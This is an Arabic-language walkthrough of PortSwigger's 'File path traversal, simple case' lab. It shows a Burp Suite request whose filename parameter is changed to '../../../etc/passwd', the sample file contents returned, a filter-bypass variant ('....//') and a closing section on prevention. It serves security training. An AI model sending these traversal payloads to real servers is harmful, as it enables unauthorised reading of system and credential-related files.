# Lab: File path traversal, simple case

> **Category:** [Path Traversal](https://github.com/AliAlMansorisec/OWASP-Top-10-2025/blob/main/A01%20-%20Broken%20Access%20Control/02-Path-Traversal.md)
> **Difficulty:** Apprentice
> **Lab Link:** [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-simple)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتج لقراءة محتوى ملف `/etc/passwd` من السيرفر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فتح المختبر

- اضغط **Access the lab** عشان يفتح لك موقع وهمي للتجربة
- أو افتح الرابط مباشرة: [PortSwigger Lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)
  
### الخطوة 2: تشغيل Burp Suite

- افتح Burp Suite
- تأكد أن الـ Proxy شغال (Intercept is on)

### الخطوة 3: اعتراض طلب الصورة

- في الموقع، حاول تشوف أي صورة منتج
- اعترض الطلب في Burp

ستجد طلب مشابه لهذا:
```http
GET /image?filename=product.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 4: تعديل الـ filename parameter

غير قيمة `filename` إلى:
```
../../../etc/passwd
```

يصبح الطلب كذا:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 5: إرسال الطلب

- اضغط **Forward** في Burp
- أو أرسل الطلب إلى Repeater (زر الماوس الأيمن → Send to Repeater) ثم اضغط **Send**

### الخطوة 6: مشاهدة النتيجة

في الـ Response، سترى محتوى ملف `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 7: حل المختبر

- ارجع إلى صفحة المختبر في المتصفح
- لما تظهر لك محتويات `/etc/passwd`، المختبر يحل نفسه تلقائياً
- راح تشوف رسالة **"Congratulations, you solved the lab!"**

---

## 🔑 ملاحظات مهمة

- **لماذا نجح هذا؟**  
  لأن الموقع ياخذ اسم الملف من المستخدم ويدمجه مع المسار بدون تحقق:  
  `/var/www/images/` + `../../../etc/passwd` = `/var/www/images/../../../etc/passwd`  
  السيرفر يتصفح للخارج من مجلد `images` حتى يصل إلى جذر النظام ثم يدخل إلى `/etc/passwd`

- **ماذا يعني `../`؟**  
  يعني "اخرج من المجلد الحالي ورجع خطوة للوراء"

- **كم عدد `../` نحتاج؟**  
  نحتاج عدد كافي عشان نخرج من مجلد الصور إلى جذر النظام.  
  في أغلب الحالات، 3 مرات تكفي: `../../../`

- **ماذا لو ما اشتغل؟**  
  جرب تزيد عدد `../` (مثل 4 أو 5) أو تجرب `....//` (لتجاوز الفلاتر)

---


## 🛡️ كيفية الوقاية (How to Prevent)

- **استخدام قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة بدلاً من المسارات الديناميكية
- **تنقية المدخلات:** ارفض أي مدخلات تحتوي على `../` أو `..\` أو `%2e%2e`
- **استخدام مسارات ثابتة:** استخدم معرفات رقمية مرتبطة بمسارات ثابتة بدل اسم الملف
- **تهيئة السيرفر:** عطل الوصول للملفات الحساسة عبر إعدادات السيرفر

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-simple)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)

